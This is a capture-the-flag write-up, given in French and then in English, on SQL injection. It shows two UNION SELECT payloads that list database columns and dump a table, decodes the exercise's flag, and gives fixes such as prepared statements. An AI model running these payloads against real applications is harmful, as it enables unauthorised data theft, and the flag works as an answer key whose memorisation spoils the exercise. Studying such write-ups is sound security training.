# Reproduction :

1. **Lister toutes les colonnes avec leurs tables associées** :  
   ```sql
   1 UNION SELECT table_name, column_name FROM information_schema.columns;
   ```
   **Résultat qui nous intéresse** :  
   - **Table** : `list_images`  
   - **Colonne** : `comment`  

2. **Afficher les contenus de la colonne `comment` dans la table `list_images`** :  
   ```sql
   1 UNION SELECT title, comment FROM list_images;
   ```
   **Résultat intriguant** :  
   - **Title** : *"If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"*  
   - **Comment** : *Hack me ?*

3. **Décodage du flag** :  
   - MD5 décrypté : `albatroz`  
   - En minuscule : `albatroz`  
   - SHA-256 : `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

---

# Problème :

L'application est vulnérable à une injection SQL, permettant :
1. De lister toutes les tables et colonnes.
2. D'explorer et afficher des données sensibles présentes dans ces tables.

---

# Solution :
1. **Requêtes préparées** :  
   Utiliser des paramètres pour empêcher l’exécution directe des entrées utilisateur, exemple en PHP :  
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
   $stmt->bindParam(':id', $id, PDO::PARAM_INT);
   $stmt->execute();
   ```  

2. **Validation des entrées** :  
   Toujours filtrer les entrées pour éviter l’exécution de commandes SQL.  

3. **Privilèges limités** :  
   L’utilisateur de la base ne doit pas avoir accès à des données comme `information_schema`.  

Avec ces corrections, on bloque ce type d’attaque.

-------------------------
-------------------------
-------------------------
-------------------------

# Reproduction:

1. **List all columns with their associated tables**:  
   ```sql
   1 UNION SELECT table_name, column_name FROM information_schema.columns;
   ```
   **Result of interest**:  
   - **Table**: `list_images`  
   - **Column**: `comment`  

2. **Display the contents of the `comment` column in the `list_images` table**:  
   ```sql
   1 UNION SELECT title, comment FROM list_images;
   ```
   **Intriguing result**:  
   - **Title**: *"If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"*  
   - **Comment**: *Hack me ?*

3. **Decoding the flag**:  
   - Decrypted MD5: `albatroz`  
   - Lowercase: `albatroz`  
   - SHA-256: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

---

# Problem:

The application is vulnerable to SQL injection, allowing:
1. Listing all tables and columns.
2. Exploring and displaying sensitive data present in these tables.

---

# Solution:
1. **Prepared statements**:  
   Use parameters to prevent direct execution of user inputs, for example in PHP:  
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
   $stmt->bindParam(':id', $id, PDO::PARAM_INT);
   $stmt->execute();
   ```  

2. **Input validation**:  
   Always filter inputs to prevent the execution of SQL commands.  

3. **Limited privileges**:  
   The database user should not have access to sensitive data such as `information_schema`.  

With these corrections, we can block this type of attack.